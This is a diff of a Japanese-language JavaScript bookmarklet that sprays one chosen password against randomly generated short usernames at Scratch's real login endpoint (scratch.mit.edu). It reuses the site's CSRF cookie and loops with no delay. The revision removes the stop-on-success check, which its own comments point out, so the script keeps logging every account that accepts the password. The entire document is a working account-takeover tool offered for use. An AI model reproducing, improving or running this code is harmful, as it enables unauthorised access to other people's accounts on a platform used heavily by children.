@@ -1,55 +1,127 @@
-javascript:(function(){try{
-const used=new Set();
-function g(n){var m=document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));return m?decodeURIComponent(m[1]):null;}
-function r(l,opts,must){
-  let c="";if(opts.includeLetters)c+="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  if(opts.includeSymbols)c+="_-";if(opts.includeNumbers)c+="0123456789";
-  if(!c){alert("少なくとも1種類は選んでください");throw new Error("文字種なし");}
-  let s=must||"";while(s.length<l)s+=c.charAt(Math.floor(Math.random()*c.length));
-  s=s.split("").sort(()=>Math.random()-0.5).join("");
-  if(used.has(s))return null;used.add(s);return s;
-}
-async function login(u,p){
-  try{
-    const res=await fetch("https://scratch.mit.edu/accounts/login/",{
-      method:"POST",credentials:"include",
-      headers:{
-        "x-csrftoken":g("scratchcsrftoken")||"a",
-        "x-requested-with":"XMLHttpRequest",
-        "content-type":"application/json",
-        "accept":"application/json"
-      },
-      body:JSON.stringify({username:u,password:p,useMessages:true})
-    });
-    if(res.status===200){log("green","✅ 成功: "+u);clearInterval(window.loginTimer);alert("成功! "+u);return true;}
-    return false;
-  }catch(e){return false;}
-}
-function log(color,msg){
-  let d=document.getElementById("loginLogDiv");
-  if(!d){
-    d=document.createElement("div");d.id="loginLogDiv";
-    Object.assign(d.style,{position:"fixed",top:"6px",right:"6px",width:"260px",maxHeight:"40vh",overflow:"auto",
-    background:"rgba(255,255,255,0.95)",border:"2px solid #333",zIndex:999999,fontSize:"12px",padding:"6px"});
-    let b=document.createElement("button");b.textContent="STOP";b.style.display="block";b.onclick=function(){clearInterval(window.loginTimer);log("crimson","⛔ 停止");};
-    d.appendChild(b);document.body.appendChild(d);
+javascript:(function(){
+try{
+  const used = new Set();
+
+  function g(n){
+    var m = document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));
+    return m ? decodeURIComponent(m[1]) : null;
   }
-  let e=document.createElement("div");e.style.color=color;e.textContent=msg;d.appendChild(e);d.scrollTop=d.scrollHeight;
-}
-(async function(){
-  const len=parseInt(prompt("生成文字数を入力","3"),10);if(!len)return;
-  let must=prompt("必ず含める文字（なしはNO）","a");if(must==="NO")must="";
-  const includeLetters=prompt("英字を含めますか？1=はい","1")==="1";
-  const includeSymbols=prompt("_ -を含めますか？1=はい","1")==="1";
-  const includeNumbers=prompt("数字を含めますか？1=はい","1")==="1";
-  const pass=prompt("パスワードを入力");if(!pass)return;
-  const opts={includeLetters,includeSymbols,includeNumbers};
-  log("black","▶ 開始 "+(new Date()).toLocaleTimeString());
-  window.loginTimer=setInterval(async()=>{
-    const user=r(len,opts,must);
-    if(!user)return;
-    const ok=await login(user,pass);
-    if(ok)clearInterval(window.loginTimer);
-  },0);
-})();
-}catch(e){alert("エラー: "+e.message);}})();
+
+  function r(l, opts, must){
+    let c = "";
+    if(opts.includeLetters) c += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    if(opts.includeSymbols) c += "_-";
+    if(opts.includeNumbers)  c += "0123456789";
+    if(!c){
+      alert("少なくとも1種類は選んでください");
+      throw new Error("文字種なし");
+    }
+    let s = must || "";
+    while(s.length < l) s += c.charAt(Math.floor(Math.random()*c.length));
+    s = s.split("").sort(() => Math.random() - 0.5).join("");
+    if(used.has(s)) return null;
+    used.add(s);
+    return s;
+  }
+
+  async function login(u, p){
+    try{
+      const res = await fetch("https://scratch.mit.edu/accounts/login/", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "x-csrftoken": g("scratchcsrftoken") || "a",
+          "x-requested-with": "XMLHttpRequest",
+          "content-type": "application/json",
+          "accept": "application/json"
+        },
+        body: JSON.stringify({
+          username: u,
+          password: p,
+          useMessages: true
+        })
+      });
+
+      if(res.status === 200){
+        log("lime", "★ 成功 ★ : " + u);
+        log("green", "→ " + u + " でログイン成功！（継続中）");
+        // ★ ここを削除・コメントアウトしたのがポイント ★
+        // clearInterval(window.loginTimer);
+        // alert("成功! " + u);  ← 毎回アラートが出るとうざいのでコメントアウト推奨
+        return true;
+      }
+      return false;
+    }catch(e){
+      return false;
+    }
+  }
+
+  function log(color, msg){
+    let d = document.getElementById("loginLogDiv");
+    if(!d){
+      d = document.createElement("div");
+      d.id = "loginLogDiv";
+      Object.assign(d.style, {
+        position: "fixed",
+        top: "6px",
+        right: "6px",
+        width: "280px",
+        maxHeight: "60vh",
+        overflow: "auto",
+        background: "rgba(255,255,255,0.96)",
+        border: "2px solid #222",
+        zIndex: 999999,
+        fontSize: "13px",
+        padding: "8px",
+        fontFamily: "Consolas, monospace"
+      });
+      let b = document.createElement("button");
+      b.textContent = "STOP";
+      b.style.cssText = "display:block; width:100%; margin-bottom:6px; padding:6px; background:#e33; color:white; border:none; cursor:pointer;";
+      b.onclick = function(){
+        clearInterval(window.loginTimer);
+        log("crimson", "⛔ 強制停止しました");
+      };
+      d.appendChild(b);
+      document.body.appendChild(d);
+    }
+    let e = document.createElement("div");
+    e.style.color = color;
+    e.textContent = msg;
+    d.appendChild(e);
+    d.scrollTop = d.scrollHeight;
+  }
+
+  (async function(){
+    const len = parseInt(prompt("生成文字数を入力","3"),10);
+    if(!len || isNaN(len)) return;
+
+    let must = prompt("必ず含める文字（なしはNO）","a");
+    if(must === "NO") must = "";
+
+    const includeLetters  = prompt("英字を含めますか？1=はい","1") === "1";
+    const includeSymbols  = prompt("_ -を含めますか？1=はい","1") === "1";
+    const includeNumbers  = prompt("数字を含めますか？1=はい","1") === "1";
+
+    const pass = prompt("試したいパスワードを入力");
+    if(!pass) return;
+
+    const opts = {includeLetters, includeSymbols, includeNumbers};
+
+    log("black", "▶ 開始 " + (new Date()).toLocaleTimeString());
+    log("gray",   "   ユーザー名長さ: " + len + "  |  必須文字: " + (must || "なし"));
+    log("gray",   "   パスワード: " + pass.replace(/./g,"*"));
+
+    window.loginTimer = setInterval(async () => {
+      const user = r(len, opts, must);
+      if(!user) return;   // 重複したらスキップ
+
+      log("navy", "試行中: " + user);
+      await login(user, pass);
+      // 成功してもここでは何もせず次のループへ
+    }, 0);   // 0ms = 可能な限り高速
+
+  })();
+}catch(e){
+  alert("エラー: " + e.message);
+}})();
